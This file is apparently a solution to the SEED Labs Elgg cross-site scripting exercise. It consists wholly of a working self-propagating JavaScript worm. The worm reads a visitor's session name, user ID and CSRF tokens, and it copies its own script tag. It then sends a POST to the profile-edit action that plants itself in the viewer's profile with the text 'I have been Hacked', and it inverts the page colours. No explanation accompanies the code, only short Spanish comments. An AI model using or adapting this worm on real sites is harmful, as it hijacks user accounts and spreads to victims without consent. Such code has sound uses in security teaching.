<script id="worm" type="text/javascript">
	window.onload = function(){
	       console.log("executing")

        var userName="&name="+elgg.session.user.name;
	var guid="&guid="+elgg.session.user.guid;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;


        var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
        var jsCode = document.getElementById("worm").innerHTML;
        var tailTag = "</" + "script>";
        var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
        var worm_payload = wormCode; 
	var description = "&description=I have been Hacked"+worm_payload;

        var content=token+ts+userName+description+"&accesslevel[description]=2&briefdescription=&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2"+guid;

	var samyGuid=59;   
	var sendurl="http://www.seed-server.com/action/profile/edit";
	if(elgg.session.user.guid!=samyGuid)
	{
		var style = document.createElement('style');
    		style.type = 'text/css'; 
    		// Definir el estilo de inversión de colores
    		var css = `
        		html {
            		filter: invert(1) hue-rotate(180deg);
        		}
        		img, video {
            		filter: invert(1) hue-rotate(180deg);
        		}
    		`;

		// Añadir los estilos a la hoja de estilos
    		style.appendChild(document.createTextNode(css));
		document.head.appendChild(style);

		// Añadir la hoja de estilos al documento

		//Create and send Ajax request to modify profile
		var Ajax=null
		Ajax=new XMLHttpRequest();
		Ajax.open("POST", sendurl, true);
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send(content);
	}
	}
</script>
